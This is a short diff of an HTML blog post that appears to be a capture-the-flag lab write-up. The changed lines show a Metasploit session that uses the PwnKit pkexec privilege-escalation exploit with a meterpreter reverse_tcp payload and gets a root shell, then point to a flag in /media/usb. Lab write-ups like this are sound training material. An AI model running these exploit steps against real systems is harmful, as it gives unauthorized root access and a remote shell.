@@ -256,7 +256,10 @@ I saw a nicer way (envolving reverse engineering) to do privelege escalation tha
 26
 27
 28
-</pre></td><td class="rouge-code"><pre>msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec 
+</pre></td>
+<td class="rouge-code">
+ <pre>
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec 
 [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
 
 msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set session 4
@@ -284,7 +287,7 @@ Process 5384 created.
 Channel 1 created.
 whoami
 root
-</pre></td>
+</div></div></pre></code></td></tbody></table>
 <p>After running which, we gain root access!</p>
 <p>Now we can look for flags one of which is hidden in "/media/usb", and move to the next room :D</p>
 
